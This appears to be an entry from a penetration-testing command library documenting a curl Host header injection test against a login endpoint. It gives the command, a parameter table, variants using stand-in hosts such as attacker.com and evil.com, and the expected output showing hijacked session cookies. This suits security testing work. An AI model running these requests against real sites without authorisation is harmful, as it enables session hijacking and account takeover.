---
id: cmd-curl-host-header
data: >-
  curl -v -H "Host: attacker.com" -X POST https://target.example.com/login -d
  "username=victim&password=pass" -c cookies.txt
tags:
  - http-injection
  - web-exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.344Z'
verified: false
validated: true
submitted: true
---
# curl-host-header-injection

## Command

```bash
curl -v -H "Host: attacker.com" -X POST https://target.example.com/login -d "username=victim&password=pass" -c cookies.txt
```

## Description

This curl command tests for Host header injection by forging the Host header in an HTTP POST request to a login endpoint. It is used to exploit vulnerabilities where the server uses the Host header unsafely for cookie domains or redirects, potentially leading to session hijacking or account takeover.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose mode to display request/response headers | No |
| `-H "Host: attacker.com"` | Custom Host header to inject malicious domain | Yes |
| `-X POST` | Specify POST method | Yes |
| `https://target.example.com/login` | Target endpoint URL | Yes |
| `-d "username=victim&password=pass"` | POST data for authentication attempt | Yes |
| `-c cookies.txt` | Save cookies to file | No |

## Examples

### Basic Usage

```bash
curl -H "Host: evil.com" https://target.com/redirect
```

### Advanced Usage

```bash
curl -v -H "Host: attacker.com" -X POST -d "data=values" https://target.com/login --cookie-jar session_cookies.txt --resolve target.com:443:attacker.ip
```

## Expected Output

Verbose output showing headers; look for Set-Cookie with the injected domain (e.g., domain=attacker.com) or unexpected redirects. Successful exploitation yields a cookie file with session tokens for the malicious host.

## Related

- [[Related Procedure|procedures/Exploit-Host-Header-Injection-for-Account-Takeover]]
